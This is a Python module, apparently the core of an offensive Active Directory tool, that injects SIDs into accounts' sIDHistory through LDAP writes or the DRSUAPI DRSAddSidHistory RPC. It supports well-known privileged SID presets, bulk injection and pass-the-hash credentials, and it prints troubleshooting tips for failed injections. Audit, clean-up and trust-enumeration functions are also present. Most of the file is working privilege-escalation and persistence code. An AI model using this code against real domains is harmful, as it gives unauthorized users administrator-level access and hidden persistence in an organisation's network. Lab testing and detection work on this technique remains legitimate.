"""
SID History Attack Implementation
Main orchestrator: wires up authentication, LDAP operations,
DRSUAPI calls, scanning, and output formatting.
"""

import logging
from typing import Optional, List, Dict, Any, Tuple

from .auth import AuthenticationManager
from .ldap_operations import LDAPOperations
from .sid_utils import SIDConverter
from .output import OutputFormatter
from .scanner import DomainScanner, AuditReport


class SIDHistoryAttack:
    """
    Main class for performing SID History operations from a remote Linux host.

    Supports two injection methods:
    - LDAP: Direct LDAP modify (works for removal; add may be blocked by DC)
    - DRSUAPI: RPC-based DRSAddSidHistory (proper method, requires specific conditions)
    """

    METHOD_LDAP = 'ldap'
    METHOD_DRSUAPI = 'drsuapi'

    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
        self.dc_ip = dc_ip
        self.domain = domain
        self.dc_hostname = dc_hostname or dc_ip

        self.auth_manager = AuthenticationManager(dc_ip, domain, dc_hostname)
        self.connection = None
        self.ldap_ops = None
        self.drsuapi_client = None
        self.base_dn = SIDConverter.domain_to_dn(domain)
        self.domain_sid = None

        self._formatter = OutputFormatter()
        self._scanner = None

        logging.info(f"Initialized targeting {dc_ip} ({domain})")

    # ─── CONNECTION MANAGEMENT ────────────────────────────────────────

    def authenticate(self, auth_method: str, **kwargs) -> bool:
        """Authenticate to the domain controller via LDAP."""
        self.connection = self.auth_manager.get_connection(auth_method, **kwargs)

        if self.connection:
            self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
            self._scanner = DomainScanner(self.ldap_ops, self.domain)

            # Try to discover domain SID
            self.domain_sid = self.ldap_ops.get_domain_sid()
            if self.domain_sid:
                logging.info(f"Domain SID: {self.domain_sid}")

            logging.info(f"Successfully authenticated to {self.dc_ip}")
            return True
        else:
            logging.error("Authentication failed")
            return False

    def connect_drsuapi(self, username: str = None, password: str = '',
                        lm_hash: str = '', nt_hash: str = '',
                        do_kerberos: bool = False) -> bool:
        """
        Establish a DRSUAPI RPC connection for DRSAddSidHistory.
        Uses stored credentials from LDAP auth if not provided.
        """
        try:
            from .drsuapi import DRSUAPIClient
        except ImportError as e:
            logging.error(f"DRSUAPI module unavailable: {e}")
            return False

        self.drsuapi_client = DRSUAPIClient(self.dc_ip, self.domain, self.dc_hostname)

        # Use stored credentials if not provided
        if not username:
            username = self.auth_manager._username or ''
            password = self.auth_manager._password or ''
            lm_hash = self.auth_manager._lm_hash or ''
            nt_hash = self.auth_manager._nt_hash or ''
            do_kerberos = self.auth_manager._do_kerberos

        success = self.drsuapi_client.connect(
            username=username,
            password=password,
            domain=self.domain,
            lm_hash=lm_hash,
            nt_hash=nt_hash,
            do_kerberos=do_kerberos
        )

        if success:
            logging.info("DRSUAPI connection established")
        else:
            logging.error("Failed to establish DRSUAPI connection")
            self.drsuapi_client = None

        return success

    def disconnect(self):
        """Close all connections."""
        if self.connection:
            try:
                self.connection.unbind()
                logging.info("LDAP disconnected")
            except Exception:
                pass
            finally:
                self.connection = None
                self.ldap_ops = None

        if self.drsuapi_client:
            self.drsuapi_client.disconnect()
            self.drsuapi_client = None

    # ─── SID LOOKUPS ──────────────────────────────────────────────────

    def get_user_sid(self, sam_account_name: str) -> Optional[str]:
        """Get the SID of any AD object by sAMAccountName."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return None
        return self.ldap_ops.get_object_sid(sam_account_name)

    def get_current_sid_history(self, sam_account_name: str) -> List[str]:
        """Get the current sIDHistory of an object."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return []
        return self.ldap_ops.get_sid_history(sam_account_name)

    def get_domain_sid(self) -> Optional[str]:
        """Get the domain SID."""
        return self.domain_sid

    def resolve_preset(self, preset_name: str) -> Optional[str]:
        """Resolve a preset name to a full SID."""
        if not self.domain_sid:
            logging.error("Domain SID not available - cannot resolve preset")
            return None
        return SIDConverter.resolve_preset(preset_name, self.domain_sid)

    # ─── SID HISTORY INJECTION ────────────────────────────────────────

    def inject_sid_history(self, target_user: str, source_user: str,
                          source_domain: Optional[str] = None,
                          method: str = METHOD_LDAP,
                          src_creds_user: str = '',
                          src_creds_domain: str = '',
                          src_creds_password: str = '') -> bool:
        """
        Inject the SID of a source user into the sIDHistory of a target.

        Args:
            target_user: sAMAccountName of target
            source_user: sAMAccountName of source
            source_domain: Source domain (for cross-domain/forest)
            method: 'ldap' or 'drsuapi'
            src_creds_user: Username for source domain auth (DRSUAPI cross-forest)
            src_creds_domain: Domain for source domain auth
            src_creds_password: Password for source domain auth
        """
        if method == self.METHOD_DRSUAPI:
            return self._inject_via_drsuapi(
                target_user, source_user, source_domain,
                src_creds_user=src_creds_user,
                src_creds_domain=src_creds_domain,
                src_creds_password=src_creds_password,
            )

        # LDAP method
        logging.info(f"Injecting SID from {source_user} into {target_user} (method: LDAP)")

        source_sid = self._resolve_source_sid(source_user, source_domain)
        if not source_sid:
            return False

        return self.add_sid_to_history(target_user, source_sid)

    def add_sid_to_history(self, target_user: str, sid_to_add: str,
                           method: str = METHOD_LDAP) -> bool:
        """Add a SID to an object's sIDHistory."""
        if method == self.METHOD_DRSUAPI:
            logging.error("DRSUAPI (DRSAddSidHistory) cannot inject arbitrary SIDs.")
            logging.error("Use --source-user/--source-domain with --method drsuapi,")
            logging.error("or use --method ldap for --sid/--preset injection.")
            return False

        if not self.ldap_ops:
            logging.error("Not connected")
            return False

        try:
            # Check if already present
            current = self.ldap_ops.get_sid_history(target_user)
            if sid_to_add in current:
                logging.warning(f"SID {sid_to_add} already in sIDHistory")
                return True

            # DRSUAPI method - use RPC DRSAddSidHistory
            if method == self.METHOD_DRSUAPI:
                return self._add_sid_via_drsuapi(target_user, sid_to_add)

            # LDAP method
            user_dn = self.ldap_ops.get_object_dn(target_user)
            if not user_dn:
                return False

            success = self.ldap_ops.add_sid_to_history(user_dn, sid_to_add)

            if success:
                name = SIDConverter.resolve_sid_name(sid_to_add, self.domain_sid)
                logging.info(f"Added {sid_to_add} ({name}) to {target_user}'s sIDHistory")
            else:
                logging.error("LDAP add failed - the DC likely blocks direct sIDHistory writes")
                logging.error("Try: --method drsuapi (for RPC-based injection)")

            return success

        except Exception as e:
            logging.error(f"Error adding SID to history: {e}")
            return False

    def _add_sid_via_drsuapi(self, target_user: str, sid_to_add: str) -> bool:
        """Add a SID via DRSUAPI DRSAddSidHistory using a synthetic source."""
        if not self.drsuapi_client:
            logging.info("Establishing DRSUAPI connection...")
            if not self.connect_drsuapi():
                logging.error("Cannot connect to DRSUAPI")
                return False

        # DRSAddSidHistory needs src_domain + src_principal
        # For same-domain preset injection, we use the domain itself as source
        src_domain = self.domain
        dst_domain = self.domain

        # Resolve the SID to a sAMAccountName for the source principal
        src_principal = self.ldap_ops.get_name_by_sid(sid_to_add)
        if not src_principal:
            logging.error(f"Cannot resolve SID {sid_to_add} to a source principal")
            return False

        logging.info(f"DRSAddSidHistory: {src_principal}@{src_domain} -> {target_user}@{dst_domain}")

        success, error_code, error_msg = self.drsuapi_client.add_sid_history(
            src_domain=src_domain,
            src_principal=src_principal,
            dst_domain=dst_domain,
            dst_principal=target_user,
        )

        if success:
            name = SIDConverter.resolve_sid_name(sid_to_add, self.domain_sid)
            logging.info(f"Added {sid_to_add} ({name}) to {target_user}'s sIDHistory via DRSUAPI")
        else:
            logging.error(f"DRSAddSidHistory failed: {error_msg} (code: {error_code})")

        return success

    def add_sid_preset(self, target_user: str, preset_name: str,
                       method: str = METHOD_LDAP) -> bool:
        """Add a well-known SID preset to an object's sIDHistory."""
        sid = self.resolve_preset(preset_name)
        if not sid:
            logging.error(f"Unknown preset: {preset_name}. "
                        f"Available: {', '.join(SIDConverter.get_preset_list())}")
            return False

        name = SIDConverter.resolve_sid_name(sid, self.domain_sid)
        logging.info(f"Preset '{preset_name}' -> {sid} ({name})")
        return self.add_sid_to_history(target_user, sid, method=method)

    def _inject_via_drsuapi(self, target_user: str, source_user: str,
                             source_domain: Optional[str] = None,
                             src_creds_user: str = '',
                             src_creds_domain: str = '',
                             src_creds_password: str = '') -> bool:
        """Inject SID History via DRSUAPI RPC (DRSAddSidHistory opnum 20)."""
        if not self.drsuapi_client:
            # Try to auto-connect
            logging.info("Establishing DRSUAPI connection...")
            if not self.connect_drsuapi():
                logging.error("Cannot connect to DRSUAPI - required for RPC injection")
                return False

        src_domain = source_domain or self.domain
        dst_domain = self.domain

        logging.info(f"DRSAddSidHistory: {source_user}@{src_domain} -> {target_user}@{dst_domain}")

        success, error_code, error_msg = self.drsuapi_client.add_sid_history(
            src_domain=src_domain,
            src_principal=source_user,
            dst_domain=dst_domain,
            dst_principal=target_user,
            src_creds_user=src_creds_user,
            src_creds_domain=src_creds_domain,
            src_creds_password=src_creds_password,
        )

        if success:
            logging.info("DRSAddSidHistory RPC call succeeded!")
        else:
            logging.error(f"DRSAddSidHistory failed: {error_msg}")
            self._suggest_drsuapi_fix(error_code)

        return success

    def _resolve_source_sid(self, source_user: str, source_domain: Optional[str] = None) -> Optional[str]:
        """Resolve source user to SID, supporting cross-domain lookups."""
        if source_domain and source_domain.lower() != self.domain.lower():
            logging.info(f"Searching for {source_user} in trusted domain {source_domain}")
            try:
                source_base_dn = SIDConverter.domain_to_dn(source_domain)
                temp_ldap = LDAPOperations(self.connection, source_base_dn)
                sid = temp_ldap.get_object_sid(source_user)
                if sid:
                    return sid
            except Exception as e:
                logging.debug(f"Cross-domain lookup failed: {e}")

            logging.warning(f"Cannot query {source_domain} - provide SID directly with --sid")
            return None

        return self.get_user_sid(source_user)

    # ─── SID HISTORY REMOVAL ─────────────────────────────────────────

    def remove_sid_from_history(self, target_user: str, sid_to_remove: str) -> bool:
        """Remove a specific SID from sIDHistory."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return False

        try:
            user_dn = self.ldap_ops.get_object_dn(target_user)
            if not user_dn:
                return False

            current = self.ldap_ops.get_sid_history(target_user)
            if sid_to_remove not in current:
                logging.warning(f"SID {sid_to_remove} not in sIDHistory")
                return True

            success = self.ldap_ops.remove_sid_from_history(user_dn, sid_to_remove)
            if success:
                logging.info(f"Removed {sid_to_remove} from {target_user}")
            return success

        except Exception as e:
            logging.error(f"Error removing SID: {e}")
            return False

    def clear_sid_history(self, target_user: str) -> bool:
        """Clear all sIDHistory entries."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return False

        try:
            user_dn = self.ldap_ops.get_object_dn(target_user)
            if not user_dn:
                return False

            success = self.ldap_ops.clear_sid_history(user_dn)
            if success:
                logging.info(f"Cleared sIDHistory for {target_user}")
            return success

        except Exception as e:
            logging.error(f"Error clearing sIDHistory: {e}")
            return False

    def copy_sid_history(self, source_user: str, target_user: str) -> bool:
        """Copy all sIDHistory from source to target."""
        source_history = self.get_current_sid_history(source_user)
        if not source_history:
            logging.error(f"No sIDHistory found on {source_user}")
            return False

        success = True
        for sid in source_history:
            if not self.add_sid_to_history(target_user, sid):
                logging.error(f"Failed to copy SID {sid}")
                success = False

        return success

    # ─── BULK OPERATIONS ──────────────────────────────────────────────

    def bulk_inject(self, targets: List[str], sid_to_add: str) -> Dict[str, bool]:
        """Inject the same SID into multiple targets."""
        results = {}
        for target in targets:
            logging.info(f"Processing {target}...")
            results[target] = self.add_sid_to_history(target, sid_to_add)
        return results

    def bulk_clear(self, targets: List[str]) -> Dict[str, bool]:
        """Clear sIDHistory from multiple targets."""
        results = {}
        for target in targets:
            logging.info(f"Clearing {target}...")
            results[target] = self.clear_sid_history(target)
        return results

    def clean_same_domain_sids(self, target_user: str) -> bool:
        """Remove only same-domain SIDs from sIDHistory (preserve migration SIDs)."""
        if not self.domain_sid:
            logging.error("Domain SID unknown - cannot identify same-domain SIDs")
            return False

        current = self.get_current_sid_history(target_user)
        success = True

        for sid in current:
            if SIDConverter.is_same_domain_sid(sid, self.domain_sid):
                logging.info(f"Removing same-domain SID: {sid}")
                if not self.remove_sid_from_history(target_user, sid):
                    success = False

        return success

    # ─── SCANNING & AUDITING ──────────────────────────────────────────

    def full_audit(self) -> Optional[AuditReport]:
        """Perform a full domain-wide sIDHistory audit."""
        if not self._scanner:
            logging.error("Not connected")
            return None
        return self._scanner.full_audit()

    def scan_user(self, sam_account_name: str):
        """Scan a single object for sIDHistory issues."""
        if not self._scanner:
            logging.error("Not connected")
            return None
        return self._scanner.scan_user(sam_account_name)

    def enumerate_trusts(self) -> List[Dict]:
        """Enumerate domain trusts."""
        if not self.ldap_ops:
            logging.error("Not connected")
            return []
        return self.ldap_ops.enumerate_trusts()

    # ─── HELPERS ──────────────────────────────────────────────────────

    @staticmethod
    def _suggest_drsuapi_fix(error_code: int):
        """Suggest fixes for common DRSUAPI errors."""
        suggestions = {
            5: "Ensure you have Domain Admin privileges in the destination domain",
            8521: "Enable 'Audit account management' (Success+Failure) on the source domain DC.\n"
                  "  On the source DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable",
            8534: "Source and destination are in the same forest.\n"
                  "  DRSAddSidHistory (flags=0) only works cross-forest.\n"
                  "  For same-forest child→parent, use a source in a different forest\n"
                  "  (e.g., essos.local → north.sevenkingdoms.local in GOAD)",
            8536: "Enable 'Audit account management' (Success+Failure) on the destination domain DC.\n"
                  "  On the destination DC, run: auditpol /set /category:\"Account Management\" /success:enable /failure:enable\n"
                  "  Also enable it on the source DC if not already done",
            8547: "You must connect to the DC that holds the destination domain NC",
            8490: "Cross-forest variant requires source and destination in different forests.\n"
                  "For same-domain, create a sacrificial account and use --method drsuapi-delsrc",
            8447: "Enable auditing: 'Audit account management' must be set to Success/Failure\n"
                  "  in both source and destination domain GPOs",
            8548: "Source DC could not be reached. Ensure:\n"
                  "  - Source DC hostname resolves correctly\n"
                  "  - TcpipClientSupport=1 is set in source DC registry\n"
                  "  - Source DC is the PDC/PDC Emulator",
            1355: "Source domain not found. Check DNS and trust configuration",
        }

        if error_code in suggestions:
            logging.error(f"Suggestion: {suggestions[error_code]}")
